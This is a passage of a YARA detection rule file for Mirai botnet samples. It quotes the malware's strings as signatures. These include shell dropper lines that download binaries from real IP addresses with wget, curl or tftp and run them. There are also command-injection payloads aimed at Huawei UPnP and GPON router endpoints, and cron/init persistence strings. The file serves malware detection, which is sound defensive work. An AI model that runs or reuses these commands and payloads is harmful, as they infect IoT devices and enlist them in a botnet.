      $s6 = "cd /tmp; wget http://94.154.35.154/sparc.urbotnetisass; curl -O http://94.154.35.154/sparc.urbotnetisass; chmod 777 sparc.urbotn" ascii /* score: '27.00'*/
      $s7 = "cd /tmp; wget http://94.154.35.154/m68k.urbotnetisass; curl -O http://94.154.35.154/m68k.urbotnetisass; chmod 777 m68k.urbotneti" ascii /* score: '27.00'*/
      $s8 = "cd /tmp; wget http://94.154.35.154/arm7.urbotnetisass; curl -O http://94.154.35.154/arm7.urbotnetisass; chmod 777 arm7.urbotneti" ascii /* score: '27.00'*/
      $s9 = "cd /tmp; wget http://94.154.35.154/arm6.urbotnetisass; curl -O http://94.154.35.154/arm6.urbotnetisass; chmod 777 arm6.urbotneti" ascii /* score: '27.00'*/
      $s10 = "cd /tmp; wget http://94.154.35.154/m68k.urbotnetisass; curl -O http://94.154.35.154/m68k.urbotnetisass; chmod 777 m68k.urbotneti" ascii /* score: '27.00'*/
      $s11 = "cd /tmp; wget http://94.154.35.154/powerpc.urbotnetisass; curl -O http://94.154.35.154/powerpc.urbotnetisass; chmod 777 powerpc." ascii /* score: '27.00'*/
      $s12 = "cd /tmp; wget http://94.154.35.154/arm.urbotnetisass; curl -O http://94.154.35.154/arm.urbotnetisass; chmod 777 arm.urbotnetisas" ascii /* score: '27.00'*/
      $s13 = "cd /tmp; wget http://94.154.35.154/mips.urbotnetisass; curl -O http://94.154.35.154/mips.urbotnetisass; chmod 777 mips.urbotneti" ascii /* score: '27.00'*/
      $s14 = "cd /tmp; wget http://94.154.35.154/arm.urbotnetisass; curl -O http://94.154.35.154/arm.urbotnetisass; chmod 777 arm.urbotnetisas" ascii /* score: '27.00'*/
      $s15 = "cd /tmp; wget http://94.154.35.154/arm5.urbotnetisass; curl -O http://94.154.35.154/arm5.urbotnetisass; chmod 777 arm5.urbotneti" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 5KB and
      8 of them
}

rule Mirai_signature__2e7b8b20 {
   meta:
      description = "_subset_batch - file Mirai(signature)_2e7b8b20.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2e7b8b20114f302ee6f4c8b77a6a0dc7bd786c026f89f956d92dffa923c6450d"
   strings:
      $x1 = "cd /tmp; wget http://45.125.66.56/ppc; curl -O http://45.125.66.56/ppc; ftpget -v 45.125.66.56 ppc ppc; chmod 777 ppc; ./ppc jaw" ascii /* score: '34.00'*/
      $x2 = "cd /tmp; wget http://45.125.66.56/arm; curl -O http://45.125.66.56/arm; ftpget -v 45.125.66.56 arm arm; chmod 777 arm; ./arm jaw" ascii /* score: '34.00'*/
      $x3 = "cd /tmp; wget http://45.125.66.56/spc; curl -O http://45.125.66.56/spc; ftpget -v 45.125.66.56 spc spc; chmod 777 spc; ./spc jaw" ascii /* score: '34.00'*/
      $x4 = "cd /tmp; wget http://45.125.66.56/i686; curl -O http://45.125.66.56/i686; ftpget -v 45.125.66.56 i686 i686; chmod 777 i686; ./i6" ascii /* score: '31.00'*/
      $x5 = "cd /tmp; wget http://45.125.66.56/sh4; curl -O http://45.125.66.56/sh4; ftpget -v 45.125.66.56 sh4 sh4; chmod 777 sh4; ./sh4 jaw" ascii /* score: '31.00'*/
      $x6 = "cd /tmp; wget http://45.125.66.56/spc; curl -O http://45.125.66.56/spc; ftpget -v 45.125.66.56 spc spc; chmod 777 spc; ./spc jaw" ascii /* score: '31.00'*/
      $x7 = "cd /tmp; wget http://45.125.66.56/x86_64; curl -O http://45.125.66.56/x86_64; ftpget -v 45.125.66.56 x86_64 x86_64; chmod 777 x8" ascii /* score: '31.00'*/
      $x8 = "cd /tmp; wget http://45.125.66.56/arm7; curl -O http://45.125.66.56/arm7; ftpget -v 45.125.66.56 arm7 arm7; chmod 777 arm7; ./ar" ascii /* score: '31.00'*/
      $x9 = "cd /tmp; wget http://45.125.66.56/x86_64; curl -O http://45.125.66.56/x86_64; ftpget -v 45.125.66.56 x86_64 x86_64; chmod 777 x8" ascii /* score: '31.00'*/
      $x10 = "cd /tmp; wget http://45.125.66.56/arm6; curl -O http://45.125.66.56/arm6; ftpget -v 45.125.66.56 arm6 arm6; chmod 777 arm6; ./ar" ascii /* score: '31.00'*/
      $x11 = "cd /tmp; wget http://45.125.66.56/arm; curl -O http://45.125.66.56/arm; ftpget -v 45.125.66.56 arm arm; chmod 777 arm; ./arm jaw" ascii /* score: '31.00'*/
      $x12 = "cd /tmp; wget http://45.125.66.56/i486; curl -O http://45.125.66.56/i486; ftpget -v 45.125.66.56 i486 i486; chmod 777 i486; ./i4" ascii /* score: '31.00'*/
      $x13 = "cd /tmp; wget http://45.125.66.56/arm5; curl -O http://45.125.66.56/arm5; ftpget -v 45.125.66.56 arm5 arm5; chmod 777 arm5; ./ar" ascii /* score: '31.00'*/
      $x14 = "cd /tmp; wget http://45.125.66.56/x86; curl -O http://45.125.66.56/x86; ftpget -v 45.125.66.56 x86 x86; chmod 777 x86; ./x86 jaw" ascii /* score: '31.00'*/
      $x15 = "cd /tmp; wget http://45.125.66.56/mpsl; curl -O http://45.125.66.56/mpsl; ftpget -v 45.125.66.56 mpsl mpsl; chmod 777 mpsl; ./mp" ascii /* score: '31.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 7KB and
      1 of ($x*)
}

rule Mirai_signature__3365156e {
   meta:
      description = "_subset_batch - file Mirai(signature)_3365156e.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3365156ee26c5f6a8e6a1964bfb772033935f29000fd40f845822394d3c8ffe0"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.83.87.206/00101010101001/morte.arc; curl -O http://103.83" ascii /* score: '33.00'*/
      $x2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.83.87.206/00101010101001/morte.arm; curl -O http://103.83" ascii /* score: '33.00'*/
      $x3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.83.87.206/00101010101001/morte.ppc; curl -O http://103.83" ascii /* score: '33.00'*/
      $x4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.83.87.206/00101010101001/morte.spc; curl -O http://103.83" ascii /* score: '33.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.83.87.206/00101010101001/morte.ppc; curl -O http://103.83" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.83.87.206/00101010101001/morte.arm7; curl -O http://103.8" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.83.87.206/00101010101001/morte.m68k; curl -O http://103.8" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.83.87.206/00101010101001/morte.arm5; curl -O http://103.8" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.83.87.206/00101010101001/morte.mips; curl -O http://103.8" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.83.87.206/00101010101001/morte.mpsl; curl -O http://103.8" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.83.87.206/00101010101001/morte.x86_64; curl -O http://103" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.83.87.206/00101010101001/morte.x86; curl -O http://103.83" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.83.87.206/00101010101001/morte.arm6; curl -O http://103.8" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.83.87.206/00101010101001/morte.i468; curl -O http://103.8" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.83.87.206/00101010101001/morte.arc; curl -O http://103.83" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 9KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__64539e9c {
   meta:
      description = "_subset_batch - file Mirai(signature)_64539e9c.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "64539e9cdf7fa3839c46fdd580d8131f48ccc3c7f7a7599fa6af6c3b9576522b"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.201.5.31/00101010101001/morte.arm; curl -O http://84.201.5" ascii /* score: '33.00'*/
      $x2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.201.5.31/00101010101001/morte.ppc; curl -O http://84.201.5" ascii /* score: '33.00'*/
      $x3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.201.5.31/00101010101001/morte.arc; curl -O http://84.201.5" ascii /* score: '33.00'*/
      $x4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.201.5.31/00101010101001/morte.spc; curl -O http://84.201.5" ascii /* score: '33.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.201.5.31/00101010101001/morte.m68k; curl -O http://84.201." ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.201.5.31/00101010101001/morte.ppc; curl -O http://84.201.5" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.201.5.31/00101010101001/morte.arc; curl -O http://84.201.5" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.201.5.31/00101010101001/morte.mips; curl -O http://84.201." ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.201.5.31/00101010101001/morte.sh4; curl -O http://84.201.5" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.201.5.31/00101010101001/morte.x86; curl -O http://84.201.5" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.201.5.31/00101010101001/morte.i686; curl -O http://84.201." ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.201.5.31/00101010101001/morte.arm6; curl -O http://84.201." ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.201.5.31/00101010101001/morte.arm5; curl -O http://84.201." ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.201.5.31/00101010101001/morte.x86_64; curl -O http://84.20" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.201.5.31/00101010101001/morte.mpsl; curl -O http://84.201." ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 9KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__275a76f9 {
   meta:
      description = "_subset_batch - file Mirai(signature)_275a76f9.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "275a76f97d7a64f36bc6d8c62052d9b1ab9b94f5b4263f2c4f6636468f51a0c7"
   strings:
      $s1 = "    cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;wget -O newcron http://81.181.129.231/huhu/titanjr.$a || curl -O newcr" ascii /* score: '29.00'*/
      $s2 = "ewcron || tftp 81.181.129.231 -c get titanjr.$a -o newcron || tftp -r titanjr.$a -g 81.181.129.231 -l newcron;chmod 777 newcron;" ascii /* score: '25.00'*/
      $s3 = "on http://81.181.129.231/huhu/titanjr.$a || busybox wget -O newcron http://81.181.129.231/huhu/titanjr.$a || busybox ftpget -v -" ascii /* score: '25.00'*/
      $s4 = "u anonymous -p anonymous -P 21 81.181.129.231 titanjr.$a newcron || busybox tftp 81.181.129.231 -c get titanjr.$a -o newcron || " ascii /* score: '22.00'*/
      $s5 = "    cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;wget -O newcron http://81.181.129.231/huhu/titanjr.$a || curl -O newcr" ascii /* score: '22.00'*/
      $s6 = "busybox tftp -r titanjr.$a -g 81.181.129.231 -l newcron || ftpget -v -u anonymous -p anonymous -P 21 81.181.129.231 titanjr.$a n" ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 2KB and
      all of them
}

rule Mirai_signature__3df3f8d8 {
   meta:
      description = "_subset_batch - file Mirai(signature)_3df3f8d8.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3df3f8d83d366df3f3f61556b721bac6e34e14d9f05acfd2844a1e8f37e9087b"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.132.57/bins/spc; curl -O http://176.65.132.57/bins/spc" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.132.57/bins/x86_64; curl -O http://176.65.132.57/bins/" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.132.57/bins/sh4; curl -O http://176.65.132.57/bins/sh4" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.132.57/bins/arm; curl -O http://176.65.132.57/bins/arm" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.132.57/bins/arm6; curl -O http://176.65.132.57/bins/ar" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.132.57/bins/x86; curl -O http://176.65.132.57/bins/x86" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.132.57/bins/ppc; curl -O http://176.65.132.57/bins/ppc" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.132.57/bins/arm5; curl -O http://176.65.132.57/bins/ar" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.132.57/bins/mipsel; curl -O http://176.65.132.57/bins/" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.132.57/bins/mips; curl -O http://176.65.132.57/bins/mi" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.132.57/bins/arm7; curl -O http://176.65.132.57/bins/ar" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.132.57/bins/m68k; curl -O http://176.65.132.57/bins/m6" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.132.57/bins/x86; curl -O http://176.65.132.57/bins/x86" ascii /* score: '27.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.132.57/bins/arm5; curl -O http://176.65.132.57/bins/ar" ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.132.57/bins/arm; curl -O http://176.65.132.57/bins/arm" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 5KB and
      8 of them
}

rule Mirai_signature__6b47a10b {
   meta:
      description = "_subset_batch - file Mirai(signature)_6b47a10b.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6b47a10b306b5ff2fdb805c2e1f79391cdc168d3519ac45eb47f20185f7b43c8"
   strings:
      $s1 = "wget http://103.77.241.144/armv6l -O armv6l || curl http://103.77.241.144/armv6l -o armv6l; chmod 777 armv6l; ./armv6l; rm -rf a" ascii /* score: '28.00'*/
      $s2 = "wget http://103.77.241.144/arc -O arc || curl http://103.77.241.144/arc -o arc; chmod 777 arc; ./arc; rm -rf arc" fullword ascii /* score: '28.00'*/
      $s3 = "wget http://103.77.241.144/armv4l -O armv4l || curl http://103.77.241.144/armv4l -o armv4l; chmod 777 armv4l; ./armv4l; rm -rf a" ascii /* score: '28.00'*/
      $s4 = "wget http://103.77.241.144/armv7l -O armv7l || curl http://103.77.241.144/armv7l -o armv7l; chmod 777 armv7l; ./armv7l; rm -rf a" ascii /* score: '28.00'*/
      $s5 = "wget http://103.77.241.144/m68k -O m68k || curl http://103.77.241.144/m68k -o m68k; chmod 777 m68k; ./m68k; rm -rf m68k" fullword ascii /* score: '28.00'*/
      $s6 = "wget http://103.77.241.144/mipsel -O mipsel || curl http://103.77.241.144/mipsel -o mipsel; chmod 777 mipsel; ./mipsel; rm -rf m" ascii /* score: '28.00'*/
      $s7 = "wget http://103.77.241.144/armv6l -O armv6l || curl http://103.77.241.144/armv6l -o armv6l; chmod 777 armv6l; ./armv6l; rm -rf a" ascii /* score: '28.00'*/
      $s8 = "wget http://103.77.241.144/armv4l -O armv4l || curl http://103.77.241.144/armv4l -o armv4l; chmod 777 armv4l; ./armv4l; rm -rf a" ascii /* score: '28.00'*/
      $s9 = "wget http://103.77.241.144/aarch64 -O aarch64 || curl http://103.77.241.144/aarch64 -o aarch64; chmod 777 aarch64; ./aarch64; rm" ascii /* score: '28.00'*/
      $s10 = "wget http://103.77.241.144/powerpc -O powerpc || curl http://103.77.241.144/powerpc -o powerpc; chmod 777 powerpc; ./powerpc; rm" ascii /* score: '28.00'*/
      $s11 = "wget http://103.77.241.144/csky -O csky || curl http://103.77.241.144/csky -o csky; chmod 777 csky; ./csky; rm -rf csky" fullword ascii /* score: '28.00'*/
      $s12 = "wget http://103.77.241.144/x86_64 -O x86_64 || curl http://103.77.241.144/x86_64 -o x86_64; chmod 777 x86_64; ./x86_64; rm -rf x" ascii /* score: '28.00'*/
      $s13 = "wget http://103.77.241.144/armv5l -O armv5l || curl http://103.77.241.144/armv5l -o armv5l; chmod 777 armv5l; ./armv5l; rm -rf a" ascii /* score: '28.00'*/
      $s14 = "wget http://103.77.241.144/i486 -O i486 || curl http://103.77.241.144/i486 -o i486; chmod 777 i486; ./i486; rm -rf i486" fullword ascii /* score: '28.00'*/
      $s15 = "wget http://103.77.241.144/x86_64 -O x86_64 || curl http://103.77.241.144/x86_64 -o x86_64; chmod 777 x86_64; ./x86_64; rm -rf x" ascii /* score: '28.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 5KB and
      8 of them
}

rule Mirai_signature__23c3da6a {
   meta:
      description = "_subset_batch - file Mirai(signature)_23c3da6a.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "23c3da6a313bf955d8eef7b7b152f44153d878fb74c6a657d91581f1dcb2fe60"
   strings:
      $x1 = "[LOCKSH] KILLING shell process PID %s (Parent PID: %d, cmdline: %s)" fullword ascii /* score: '33.50'*/
      $s2 = "[LOCKSH] SKIPPING SSH process PID %s (Parent PID: %d)" fullword ascii /* score: '21.00'*/
      $s3 = "[CLEAN] KILLING PID %d (failed real path check)" fullword ascii /* score: '10.00'*/
      $s4 = "[CLEAN] SKIPPING SSH daemon PID %d at %s" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__61c62920 {
   meta:
      description = "_subset_batch - file Mirai(signature)_61c62920.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "61c6292002e70958966d086c3010ee939bc0c60b0abc2b81f667a1bc9d800b53"
   strings:
      $x1 = "[LOCKSH] KILLING shell process PID %s (Parent PID: %d, cmdline: %s)" fullword ascii /* score: '33.50'*/
      $s2 = "[LOCKSH] SKIPPING SSH process PID %s (Parent PID: %d)" fullword ascii /* score: '21.00'*/
      $s3 = "[CLEAN] KILLING PID %d (failed real path check)" fullword ascii /* score: '10.00'*/
      $s4 = "[CLEAN] SKIPPING SSH daemon PID %d at %s" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__3e5ee85c {
   meta:
      description = "_subset_batch - file Mirai(signature)_3e5ee85c.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3e5ee85c900647af568d41076a3dc1a2600dbbd1355744895b89181ce44ca7f4"
   strings:
      $s1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '29.00'*/
      $s2 = " -l /tmp/ki -r /hmips; /bin/busybox chmod 777 * /tmp/ki; /tmp/ki huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDo" ascii /* score: '25.00'*/
      $s3 = " -l /tmp/ki -r /hmips; /bin/busybox chmod 777 * /tmp/ki; /tmp/ki huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDo" ascii /* score: '25.00'*/
      $s4 = "--login" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule Mirai_signature__56fb720a {
   meta:
      description = "_subset_batch - file Mirai(signature)_56fb720a.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "56fb720aa04bb923a80712cd690510c2c532e5cc3fe0e32868eb4097cc3132bf"
   strings:
      $s1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '29.00'*/
      $s2 = " -l /tmp/ki -r /hmips; /bin/busybox chmod 777 * /tmp/ki; /tmp/ki huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDo" ascii /* score: '25.00'*/
      $s3 = " -l /tmp/ki -r /hmips; /bin/busybox chmod 777 * /tmp/ki; /tmp/ki huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDo" ascii /* score: '25.00'*/
      $s4 = "--login" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__5c562f05 {
   meta:
      description = "_subset_batch - file Mirai(signature)_5c562f05.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5c562f056c28b2226411e060d557591a6cbe1c9298fd8375f82187070be67ac1"
   strings:
      $s1 = "(condi/main): detected newer instance running! killing process" fullword ascii /* score: '15.00'*/
      $s2 = "(condi/main): Attempting to connect to CNC" fullword ascii /* score: '11.00'*/
      $s3 = "(condi/reslove) Resolved %s to %d IPv4 addresses" fullword ascii /* score: '10.00'*/
      $s4 = "(condi/ensure) Error creating socket for ESI port" fullword ascii /* score: '10.00'*/
      $s5 = "(condi/main): failed to resolve cnc address from domain" fullword ascii /* score: '10.00'*/
      $s6 = "(condi/main): Lost connection with CNC (errno = %d) 2" fullword ascii /* score: '10.00'*/
      $s7 = "(condi/main): Lost connection with CNC (errno = %d) 1" fullword ascii /* score: '10.00'*/
      $s8 = "[attack] launching attack ID: %d, duration: %d" fullword ascii /* score: '9.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__6478110b {
   meta:
      description = "_subset_batch - file Mirai(signature)_6478110b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6478110bf3f984103fcb8af12901865b1c9ff55ff73bff08c61ab062a50267d8"
   strings:
      $s1 = "X__get_myaddress: socket" fullword ascii /* score: '12.00'*/
      $s2 = "vlbad auth_len gid %d str %d auth %d" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__36ac601e {
   meta:
      description = "_subset_batch - file Mirai(signature)_36ac601e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "36ac601ee6457ae4896c7767215144d3d74874948485866e5cc9f6263ad9bbea"
   strings:
      $s1 = "/usr/sbid -D" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__25238642 {
   meta:
      description = "_subset_batch - file Mirai(signature)_25238642.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "25238642826b2cddf510638eaf28a0a4f5d79091595868d01a312b8e9670d9d6"
   strings:
      $s1 = "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/" ascii /* score: '20.00'*/
      $s2 = "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/" ascii /* score: '20.00'*/
      $s3 = "bang2012@protonmail.com" fullword ascii /* score: '18.00'*/
      $s4 = "/tmp/contact.txt" fullword ascii /* score: '14.00'*/
      $s5 = "# Short-Description: rondo" fullword ascii /* score: '14.00'*/
      $s6 = "getinfo xyz" fullword ascii /* score: '11.00'*/
      $s7 = "@reboot root %s %s.persisted" fullword ascii /* score: '10.00'*/
      $s8 = "# Description:       rondo" fullword ascii /* score: '9.00'*/
      $s9 = "# Required-Stop:" fullword ascii /* score: '8.00'*/
      $s10 = "### BEGIN INIT INFO" fullword ascii /* score: '8.00'*/
      $s11 = "### END INIT INFO" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule Mirai_signature__6b783e1c {
   meta:
      description = "_subset_batch - file Mirai(signature)_6b783e1c.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6b783e1c1014c9e8e15f511bd6b45b0d24aa399156e2980170dd01a74925901d"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '46.00'*/
      $s2 = "GET /shell?cd+/tmp;rm+-rf+*;wget+45.90.12.71/jaws;sh+/tmp/jaws HTTP/1.1" fullword ascii /* score: '29.00'*/
      $s3 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://45.90.12.71/bin+-O+/tmp/gaf;sh+/tmp/gaf`&ipv=0" fullword ascii /* score: '25.00'*/
      $s4 = "User-Agent: Hello, world" fullword ascii /* score: '22.00'*/
      $s5 = "User-Agent: Hello, World" fullword ascii /* score: '22.00'*/
      $s6 = " -g 45.90.12.71 -l /tmp/.hiroshima -r /596a96cc7bf9108cd896f33c44aedc8a/db0fa4b8db0333367e9bda3ab68b8042.mips; /bin/busybox chmo" ascii /* score: '22.00'*/
      $s7 = "d 777 * /tmp/.hiroshima; /tmp/.hiroshima huawei.selfrep)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Up" ascii /* score: '21.00'*/
      $s8 = "POST /GponForm/diag_Form?style/ HTTP/1.1" fullword ascii /* score: '16.00'*/
      $s9 = "Host: 127.0.0.1:80" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__264c263b {
   meta:
      description = "_subset_batch - file Mirai(signature)_264c263b.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "264c263b24e8de2d15a286c79a4179ce6023da5febe0f2381a7289bb3668cd2c"
   strings:
      $s1 = "wget http://45.153.34.7/m/arm7" fullword ascii /* score: '17.00'*/
      $s2 = "wget http://45.153.34.7/m/arm5" fullword ascii /* score: '17.00'*/
      $s3 = "wget http://45.153.34.7/m/mpsl" fullword ascii /* score: '17.00'*/
      $s4 = "wget http://45.153.34.7/m/moobs" fullword ascii /* score: '17.00'*/
      $s5 = "wget http://45.153.34.7/m/arm4" fullword ascii /* score: '17.00'*/
      $s6 = "./arm4 matos.rshell" fullword ascii /* score: '9.00'*/
      $s7 = "./arm7 matos.rshell" fullword ascii /* score: '9.00'*/
      $s8 = "./moobs matos.rshell" fullword ascii /* score: '9.00'*/
      $s9 = "./arm5 matos.rshell" fullword ascii /* score: '9.00'*/
      $s10 = "./mpsl matos.rshell" fullword ascii /* score: '9.00'*/
      $s11 = "rm -rf moobs mpsl arm4 arm5 arm7" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6d72 and filesize < 1KB and
      8 of them
}

rule Mirai_signature__3f16c801 {
   meta:
      description = "_subset_batch - file Mirai(signature)_3f16c801.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3f16c801cc92a9e1f822a4f806c890f60ce3cd51e184eaded539da01b9379274"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '46.00'*/
      $s2 = "GET /shell?cd+/tmp;rm+-rf+*;wget+45.90.12.71/jaws;sh+/tmp/jaws HTTP/1.1" fullword ascii /* score: '29.00'*/
